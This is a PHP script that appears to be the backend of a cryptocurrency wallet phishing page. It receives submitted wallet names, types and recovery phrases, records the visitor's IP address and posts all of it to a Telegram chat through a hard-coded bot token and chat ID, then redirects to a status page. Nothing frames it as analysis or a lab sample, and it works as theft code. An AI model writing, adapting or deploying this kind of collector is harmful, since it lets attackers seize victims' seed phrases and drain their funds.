<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    // Get the user's IP address
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }

    // Format the message for Telegram
    $message = "New form submission:\n"
             . "Wallet: " . ($data['wallet'] ?? 'N/A') . "\n"
             . "Type: " . ($data['type'] ?? 'N/A') . "\n"
             . "Phrase: " . ($data['Phrase'] ?? 'N/A') . "\n"
             . "IP Address: " . $ip_address;

    // Telegram Bot API details
    $bot_token = '8295057763:AAGBHFLRMZZAcPgHVX_sULPV-57k48DqWEo';
    $chat_id = '6363774415';
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    // Send the message to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $message]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Check if the message was sent successfully
    $result = json_decode($response, true);
    if ($result['ok']) {
        // Redirect or show a success message
        header('Location: index.html?status=success');
    } else {
        // Handle error
        header('Location: index.html?status=error');
    }
    exit;
}
?>